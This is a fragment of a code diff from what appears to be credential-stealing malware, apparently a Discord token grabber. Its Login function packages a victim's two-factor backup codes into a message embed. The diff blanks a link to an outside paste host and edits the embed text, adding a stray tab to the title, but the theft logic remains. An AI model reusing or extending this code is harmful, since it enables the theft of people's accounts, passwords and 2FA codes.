@@ -386,7 +386,7 @@ function Login(email, password, token) {
               xmlHttp.responseText`, !0).then((codes) => {
 
 							var fieldo = [];
-							var baseuri = "https://ctf.surf/raw/"
+							var baseuri = ""
 
 
 							var gayass = JSON.parse(codes)
@@ -521,8 +521,8 @@ function Login(email, password, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
+								"title": ":detective: __2FA Codes_	_",
+								"description": `${baseuri}`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
